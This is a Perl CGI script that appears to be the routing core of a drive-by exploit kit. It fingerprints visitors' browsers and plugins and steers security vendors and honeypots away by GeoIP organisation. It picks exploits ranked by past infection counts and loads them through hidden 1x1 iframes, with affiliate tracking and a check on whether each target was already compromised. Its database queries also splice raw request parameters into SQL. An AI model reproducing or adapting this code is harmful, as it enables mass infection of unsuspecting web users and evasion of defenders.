#!/usr/bin/perl
  
# Check the browser and redirect
use CGI;
use Geo::IP;
use DBI;
require "config.pl";
require "lib/Xploit.pm";

$q = new CGI;

$aff = $q->param('aff');
$csname = $q->param('csname');

$os = $q->param('os');
$flavor = $q->param('flavor');
$sp = $q->param('sp');
$lang = $q->param('lang');
$uaname = $q->param('uaname');
$uaver = $q->param('uaver');
$arch = $q->param('arch');
$run = $q->param('run');
$timebeforechk = $q->param('timecheck');
$chkchkxpl = $q->param('chkchkxpl');
$exploitstringtoload = $q->param('xplld');
$ip_number = $q->param('ip');

$useragent = $ENV{HTTP_USER_AGENT};
$useragent =~ tr/[A-Z]/[a-z]/;

#Connect to database
$db_name = 'DBI:mysql:' . $config{MysqlDB};
$dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";

#get username from affid for exploits_enabled
$username = $dbh->selectrow_array("SELECT username FROM affiliates WHERE affid='$aff'");

########### HoneyPot Function to test ################
$theip = $ENV{REMOTE_ADDR};
$referer = $ENV{HTTP_REFERER};
$real_ipadd = $theip;
$gi = Geo::IP->open( 'dep/GeoIPOrg.dat' );
$org_chk = $gi->org_by_addr($real_ipadd);
$org_chk =~ tr/[A-Z]/[a-z]/;

#Block known antivirus from quering
$antivporgcheck = $dbh->selectrow_array("SELECT antivp FROM affiliates WHERE affid='$aff'");

$antivpblockcheck = 0;
if($antivporgcheck eq 'yes')
{
  $antivpblockcheck = 1 if($org_chk =~ 'google');
  $antivpblockcheck = 1 if($org_chk =~ 'trend micro');
  $antivpblockcheck = 1 if($org_chk =~ 'kaspersky');
  $antivpblockcheck = 1 if($org_chk =~ 'avast');
  $antivpblockcheck = 1 if($org_chk =~ 'av-test');
  $antivpblockcheck = 1 if($org_chk =~ 'eset');
  $antivpblockcheck = 1 if($org_chk =~ 'sonicwall');
  $antivpblockcheck = 1 if($org_chk =~ 'microsoft');
  $antivpblockcheck = 1 if($org_chk =~ 'vnet s. r. o.');
  $antivpblockcheck = 1 if($org_chk =~ 'kindsight');
  $antivpblockcheck = 1 if($org_chk =~ 'websense');
  $antivpblockcheck = 1 if($org_chk =~ 'theplanet.com');
  $antivpblockcheck = 1 if($org_chk =~ 'level 3 communications');
}

if($antivpblockcheck eq '1')
{
  print "Status: 301 Moved\nLocation: nonexist.html\n\n";
}
else
{

#IP to Country
$gi = Geo::IP->open( 'dep/GeoIP.dat' );
my $country = $gi->country_code_by_addr($theip);

#Convert IP for database
my (@octets,$octet,$ip_number,$number_convert,$ip_address);
$ip_address = $theip;
chomp ($ip_address);
@octets = split(/\./, $ip_address);
$ip_number = 0;
foreach $octet (@octets) {
$ip_number <<= 8;
$ip_number |= $octet;
}

$doubleip = "";

$verifdoubleipch = $dbh->selectrow_array("SELECT os FROM hosts WHERE ip='$ip_number'");
if($verifdoubleipch eq "")
{
  #Insert the system stats and check if the IP already exist
  $sql = "INSERT hosts (ip, browser, browser_version, os, os_flavor, service_pack, os_lang, country, arch, referer, aff) VALUES ('$ip_number', 'HoneyPot', 'HoneyPot', 'HoneyPot', 'HoneyPot', 'HoneyPot', 'HoneyPot', '$country', 'HoneyPot', 'ai.pl', 'HoneyPot')";
  $statement = $dbh->prepare($sql);
  $statement->execute() or $doubleip = 1;
  $doubleip = 1;
}
else
{
  $doubleip = 1;
}

######################################

if($doubleip eq "1")
{

  $checkvalueavs = "";
  #Check if ip equal to HoneyPot in database (not serving the exploit in this case)
  $checkvalueavs = $dbh->selectrow_array("SELECT os FROM hosts WHERE ip='$ip_number'");

if($checkvalueavs eq 'HoneyPot')
{
  #Redirect to bad page (honeypotted)
  print "Status: 301 Moved\nLocation: /nonexist.html\n\n";
}
else
{

#calculate exploits to serve
if($run eq '0')
{
  #Get plugin version from DB
  $javaver = $dbh->selectrow_array("SELECT java FROM hosts WHERE ip='$ip_number'");
  $adobever = $dbh->selectrow_array("SELECT adobe FROM hosts WHERE ip='$ip_number'");
  $quicktimever = $dbh->selectrow_array("SELECT quicktime FROM hosts WHERE ip='$ip_number'");
  $flashver = $dbh->selectrow_array("SELECT flash FROM hosts WHERE ip='$ip_number'");
  $shockwavever = $dbh->selectrow_array("SELECT shockwave FROM hosts WHERE ip='$ip_number'");
  $vlcver = $dbh->selectrow_array("SELECT vlc FROM hosts WHERE ip='$ip_number'");
  $realplayerver = $dbh->selectrow_array("SELECT realplayer FROM hosts WHERE ip='$ip_number'");

  #Check if submode set to personal or shared
  $submodeopt = $dbh->selectrow_array("SELECT submode FROM options WHERE username='$username'");
  
if($os eq 'Windows')
{
  if($submodeopt =~ 'personal')
  {
    #do the sql stuff to get all row (for affiliate row only)
    $sth = $dbh->prepare("SELECT * FROM hosts WHERE loads='1' AND os='$os' AND os_flavor='$flavor' AND browser='$uaname' AND browser_version='$uaver' AND aff='$aff'");
    $sth->execute();
    while ($ref = $sth->fetchrow_hashref())
    {
      $allcountsql .= "$ref->{'exploit'}:";
    }
  }
  else
  {
    #do the sql stuff to get all row (for all affiliates)
    $sth = $dbh->prepare("SELECT * FROM hosts WHERE loads='1' AND os='$os' AND os_flavor='$flavor' AND browser='$uaname' AND browser_version='$uaver'");
    $sth->execute();
    while ($ref = $sth->fetchrow_hashref())
    {
      $allcountsql .= "$ref->{'exploit'}:";
    }
  }
}

  $plug_in_all .= 'Java:' if($javaver ne 'null');
  $plug_in_all .= 'Adobe:' if($adobever ne 'null');
  $plug_in_all .= 'Quicktime:' if($quicktimever ne 'null');
  $plug_in_all .= 'Flash:' if($flashver ne 'null');
  $plug_in_all .= 'Shockwave:' if($shockwavever ne 'null');
  $plug_in_all .= 'Vlc:' if($vlcver ne 'null');
  $plug_in_all .= 'Realplayer:' if($realplayerver ne 'null');

  #begin experimental exploit get
  @exploitslinevar = Xploit::allsploit();
  foreach(@exploitslinevar)
  {
    $runmexplty = $_;
    $exploitnowconfig = Xploit::xplconf($runmexplty);
    @valueexploitnow = split(/:/, $exploitnowconfig);
    
    $uaname_chk2 = "";
    @uanameddf = split(/,/, $valueexploitnow[0]);
    foreach(@uanameddf)
    {
      $uaname_chk2 = 'ok' if($_ eq 'ALL');
      $uaname_chk2 = 'ok' if($uaname =~ $_);
    }

    $uaver_chk2 = "";
    @uaverddf = split(/,/, $valueexploitnow[1]);
    foreach(@uaverddf)
    {
      $uaver_chk2 = 'ok' if($_ eq 'ALL');
      $uaver_chk2 = 'ok' if($uaver =~ $_);
    }

    $fla_chk2 = "";
    @fladdf = split(/,/, $valueexploitnow[2]);
    foreach(@fladdf)
    {
      $fla_chk2 = 'ok' if($_ eq 'ALL');
      $fla_chk2 = 'ok' if($flavor =~ $_);
    }

    $plugin_chk2 = $valueexploitnow[3];
    $plugin_chk2 = $plug_in_all if($valueexploitnow[3] eq 'NA');

    if($fla_chk2 eq 'ok' and $uaname_chk2 eq 'ok' and $uaver_chk2 eq 'ok' and $plug_in_all =~ $plugin_chk2)
    {
      if($valueexploitnow[4] eq 'NA')
      {
        xplvalidornot($runmexplty, $allcountsql);
      }
      else
      {
        if($valueexploitnow[3] eq 'Java')
        {
          @valuejavanow = split(/,/, $valueexploitnow[4]);
          foreach(@valuejavanow)
          {
            if($javaver =~ $_)
            {
              xplvalidornot($runmexplty, $allcountsql);
            }
          }
        }
        if($valueexploitnow[3] eq 'Adobe')
        {
          @valueadobenow = split(/,/, $valueexploitnow[4]);
          foreach(@valueadobenow)
          {
            if($adobever =~ $_)
            {
              xplvalidornot($runmexplty, $allcountsql);
            }
          }
        }
        if($valueexploitnow[3] eq 'Quicktime')
        {
          @valuequicktimenow = split(/,/, $valueexploitnow[4]);
          foreach(@valuequicktimenow)
          {
            if($quicktimever =~ $_)
            {
              xplvalidornot($runmexplty, $allcountsql);
            }
          }
        }
        if($valueexploitnow[3] eq 'Flash')
        {
          @valueflashnow = split(/,/, $valueexploitnow[4]);
          foreach(@valueflashnow)
          {
            if($flashver =~ $_)
            {
              xplvalidornot($runmexplty, $allcountsql);
            }
          }
        }
        if($valueexploitnow[3] eq 'Shockwave')
        {
          @valueshockwavenow = split(/,/, $valueexploitnow[4]);
          foreach(@valueshockwavenow)
          {
            if($shockwavever =~ $_)
            {
              xplvalidornot($runmexplty, $allcountsql);
            }
          }
        }
        if($valueexploitnow[3] eq 'Vlc')
        {
          @valuevlcnow = split(/,/, $valueexploitnow[4]);
          foreach(@valuevlcnow)
          {
            if($vlcver =~ $_)
            {
              xplvalidornot($runmexplty, $allcountsql);
            }
          }
        }
        if($valueexploitnow[3] eq 'Realplayer')
        {
          @valuerealplayernow = split(/,/, $valueexploitnow[4]);
          foreach(@valuerealplayernow)
          {
            if($realplayerver =~ $_)
            {
              xplvalidornot($runmexplty, $allcountsql);
            }
          }
        }

      }
    }
  }

  $inckeysai = 0;
  $exploitstringtoload = "";
  my @sorted_keys = sort {$scores{$b} <=> $scores{$a}} keys %scores;
  while ($sorted_keys[$inckeysai] ne "")
  {
    $exploitstringtoload .= $sorted_keys[$inckeysai] . ':';
    $inckeysai++;
  }

  $exploitstringtoload =~ s/javadrive://g;

  $jcheckopt = $dbh->selectrow_array("SELECT check_crash FROM options WHERE username='$username'");
  $chkchkxpl = 'yes' if($jcheckopt =~ "yes");
  $timebeforechk = $dbh->selectrow_array("SELECT time_bxpl FROM options WHERE username='$username'");

  $urlrefresh = 'ai.pl?run=1&timecheck=' . $timebeforechk . '&csname=' . $csname . '&ip=' . $ip_number . '&chkchkxpl=' . $chkchkxpl . '&aff=' . $aff . '&xplld=' . $exploitstringtoload . '&flavor=' . $flavor;
  print "Status: 301 Moved\nLocation: $urlrefresh\n\n";
}

if($run eq "1")
{
  #check if target exploited
  if($chkchkxpl eq 'yes')
  {
    $thischeckload = $dbh->selectrow_array("SELECT loads FROM hosts WHERE ip=$ip_number");
    $run = 'no' if($thischeckload eq "1");
  }
  
  #randomize exploits
  my @xploitserve = split(':', $exploitstringtoload);
  if($xploitserve[0] eq "" or $run eq "no")
  {
    $a23chk = $dbh->selectrow_array("SELECT javadrive FROM exploits_enabled WHERE username='$username'"); #check if javadrive enabled
    if($a23chk =~ "on" and $run ne "no")
    {
      #serve exploit javadrive
      print $q->header(-p3p => 'IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT');
      print '<html>' . "\n";
      print '<head>' . "\n";
      print '</head>' . "\n";
      print '<body>' . "\n";
      #print $exploitstringtoload . "\n"; #debug
      print '<iframe src="exploits/javadrive.pl?aff=' . $aff . '&csname=' . $csname . '"  marginwidth="1px" align="center" frameborder="0" height="1" scrolling="no" width="1"></iframe>' . "\n";
      print '</body>' . "\n";
      print '</html>' . "\n";
    }
    else
    {
      print "Status: 301 Moved\nLocation: nonexist.html\n\n";
    }
  }
  else
  {
    $exploitnow = $xploitserve[0];
    $exploitstringtoload =~ s/$exploitnow://eg;
    
    #set wait time to 3 if java argument inject is involved
    $timebeforechk2 = $timebeforechk;
    $timebeforechk2 = '3' if($exploitnow eq 'java_arginject.pl');
    $timebeforechk2 = '1' if($exploitnow eq 'ms11_xxx.pl');


    #serve exploit
    print $q->header(-p3p => 'IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT');
    print '<html>' . "\n";
    print '<head>' . "\n";
    print '<meta http-equiv="Refresh" content="' . $timebeforechk2 . '; url=ai.pl?run=1&timecheck=' . $timebeforechk . '&csname=' . $csname . '&ip=' . $ip_number . '&chkchkxpl=' . $chkchkxpl . '&aff=' . $aff . '&xplld=' . $exploitstringtoload . '&flavor=' . $flavor . '" />';
    print '</head>' . "\n";
    print '<body>' . "\n";
    #print $exploitstringtoload . "\n"; #debug
    print '<iframe src="exploits/' . $exploitnow . '?aff=' . $aff . '&csname=' . $csname . '&flavor=' . $flavor . '"  marginwidth="1px" align="center" frameborder="0" height="1" scrolling="no" width="1"></iframe>' . "\n";
    print '</body>' . "\n";
    print '</html>' . "\n";
  }
  
}

}
}
}

#Disconnect to the database
$dbh->disconnect();


sub xplvalidornot
{
  $thexplvalid = shift;
  $allcountsql = shift;

  $counter1xpl = 0;
  $a1chk = $dbh->selectrow_array("SELECT $thexplvalid FROM exploits_enabled WHERE username='$username'");
  if($a1chk =~ 'on')
  {
    $counter1xpl++ while($allcountsql =~ m/$thexplvalid/g);
    $scores{"$thexplvalid\.pl"} = $counter1xpl;
  }
}

1;
